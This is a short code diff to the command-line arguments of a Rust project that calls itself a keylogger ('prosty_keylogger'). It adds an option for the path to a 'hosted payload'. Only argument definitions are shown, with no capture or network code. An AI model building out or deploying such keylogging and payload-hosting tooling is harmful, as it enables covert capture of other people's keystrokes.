@@ -1,3 +1,4 @@
+use std::path::PathBuf;
 use clap::Parser;
 use prosty_keylogger::common::TaskConfiguration;
 
@@ -25,6 +26,9 @@ pub struct Args{
 
     #[arg(short = 'i', long="interval", help = "Probe interval in milliseconds", default_value_t = 100)]
     pub interval: u32,
+
+    #[arg(short = 'H', long = "host-file", help = "Path to hosted payload", default_value = "./client")]
+    pub host_file: PathBuf,
 
 
 
